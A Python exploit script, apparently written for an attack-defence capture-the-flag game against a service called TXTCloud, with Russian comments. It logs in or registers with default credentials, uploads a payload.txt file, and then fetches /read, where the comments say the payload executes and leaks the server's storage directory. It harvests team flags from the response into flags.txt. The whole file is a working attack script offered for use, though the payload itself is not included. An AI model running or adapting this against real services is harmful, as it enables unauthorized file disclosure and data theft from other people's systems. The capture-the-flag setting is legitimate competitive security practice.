#!/usr/bin/env python3

import os
import re
import sys

import requests

# ----------------------- КОНФИГ -----------------------
BASE_URL = os.environ.get("TXTCLOUD_URL", "http://127.0.0.1:5000").rstrip("/")
LOGIN    = os.environ.get("SPLOIT_LOGIN", "123")
PASSWORD = os.environ.get("SPLOIT_PASSWORD", "123")
TIMEOUT  = int(os.environ.get("SPLOIT_TIMEOUT", "15"))

HERE         = os.path.dirname(os.path.abspath(__file__))
PAYLOAD_FILE = os.path.join(HERE, "payload.txt")
FLAGS_FILE   = os.path.join(HERE, "flags.txt")

FLAG_RE = re.compile(r"TEAM[0-9]{3}_[A-Z0-9]{32}")
# -------------------------------------------------------


def make_session():
    s = requests.Session()
    s.headers.update({"User-Agent": "TXTCloudSploit/1.0"})
    return s


def do_login(session):
    """Пытается войти под LOGIN/PASSWORD. True — если попали на /account."""
    r = session.post(
        f"{BASE_URL}/login",
        data={"login": LOGIN, "password": PASSWORD},
        timeout=TIMEOUT,
        allow_redirects=True,
    )
    return "/account" in r.url


def do_register(session):
    """Регистрирует LOGIN/PASSWORD. True при успехе."""
    r = session.post(
        f"{BASE_URL}/register",
        data={"login": LOGIN, "password": PASSWORD},
        timeout=TIMEOUT,
        allow_redirects=True,
    )
    return "/register/success" in r.url or "/account" in r.url


def has_note(session):
    """Есть ли уже загруженный .txt (проверяем текст /files)."""
    r = session.get(f"{BASE_URL}/files", timeout=TIMEOUT)
    return "Файл загружен и готов к чтению" in r.text


def upload_payload(session):
    with open(PAYLOAD_FILE, "rb") as fh:
        data = fh.read()
    r = session.post(
        f"{BASE_URL}/upload",
        files={"file": ("payload.txt", data, "text/plain")},
        timeout=TIMEOUT,
        allow_redirects=True,
    )
    return "Файл успешно загружен" in r.text


def fetch_read(session):
    r = session.get(f"{BASE_URL}/read", timeout=TIMEOUT, allow_redirects=True)
    return r.text


def load_existing_flags():
    if not os.path.isfile(FLAGS_FILE):
        return set()
    with open(FLAGS_FILE, "r", encoding="utf-8") as fh:
        return {ln.strip() for ln in fh if ln.strip()}


def append_flags(flags):
    """Дописывает только новые флаги, по одному на строку."""
    existing = load_existing_flags()
    new = [f for f in flags if f not in existing]
    if not new:
        return []
    with open(FLAGS_FILE, "a", encoding="utf-8") as fh:
        for f in new:
            fh.write(f + "\n")
    return new


def main():
    print(f"[*] Target: {BASE_URL}")

    if not os.path.isfile(PAYLOAD_FILE):
        print(f"[!] Не найден файл payload.txt: {PAYLOAD_FILE}")
        return 1

    session = make_session()

    # 1) Логин или регистрация
    if do_login(session):
        print(f"[+] Вошли как {LOGIN!r}")
    elif do_register(session):
        print(f"[+] Зарегистрировали {LOGIN!r}")
    else:
        print("[!] Не удалось ни войти, ни зарегистрироваться")
        return 1

    # 2) Загрузка payload (только если файла ещё нет)
    if has_note(session):
        print("[*] Файл уже загружен — читаем существующий")
    else:
        if upload_payload(session):
            print("[+] payload.txt загружен")
        else:
            print("[!] Не удалось загрузить payload.txt")
            return 1

    # 3) Чтение /read — payload исполняется, утечка содержимого storage/
    body = fetch_read(session)
    if "Содержимое вашего файла" not in body:
        print("[!] Неожиданный ответ /read (нет заголовка страницы)")
        return 1

    # 4) Извлекаем флаги
    flags = list(dict.fromkeys(FLAG_RE.findall(body)))
    print(f"[*] Найдено флагов на странице: {len(flags)}")

    # 5) Пишем новые в flags.txt
    new = append_flags(flags)
    for f in new:
        print(f"[+] {f}")
    print(f"[*] Новых флагов записано в {FLAGS_FILE}: {len(new)}")

    return 0


if __name__ == "__main__":
    sys.exit(main())
